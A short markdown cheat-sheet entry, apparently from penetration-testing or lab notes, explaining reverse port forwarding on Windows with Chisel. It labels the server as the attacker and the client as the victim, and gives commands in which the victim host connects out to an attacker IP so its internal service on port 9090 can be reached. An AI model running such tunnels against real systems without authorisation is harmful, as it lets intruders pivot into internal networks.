# Port Forwarding in Windows

> **NOTE :** For port forwarding in Linux, look at the `SSH` section of `Remote Management Tools` (in the current directory).

## Tool 1 : Chisel

### Remote Port Forwarding

#### **Aim :** To expose a service running on a client system (Victim) to remote clients via the server system's port.  

- Run `systeminfo` to get the details of the Victim machine such as *System Type*, *Processor* etc., and download the appropriate and latest Chisel binary from [Chisel's GitHub repo](https://github.com/jpillora/chisel/releases).

- Ensure the binaries utilized on both the server and client systems are of the same version number.

#### *Command to be run on the Server System (Attacker) :*

```bash
chisel server -p 12312 --reverse

# O/p

# 2024/07/15 20:10:31 server: Reverse tunnelling enabled
# 2024/07/15 20:10:31 server: Fingerprint <SOMETHING>
# 2024/07/15 20:10:31 server: Listening on http[:]//0.0.0.0:12312

# // After the client command is run:

# 2024/07/15 20:16:02 server: session#1: Client version (1.9.1) differs from server version (1.9.1-0kali1)
# 2024/07/15 20:16:02 server: session#1: tun: proxy#R:9090=>9090: Listening
```

#### *Command to be run on the Client System (Victim) :*

```powershell
./chisel.exe client 10.10.16.89:12312 R:9090:127.0.0.1:9090
```

Now the internal service on the Victim Windows system listening on 127.0.0.1:9090 **can be accessed via the port 9090 of the Server System** (Attacker's machine).
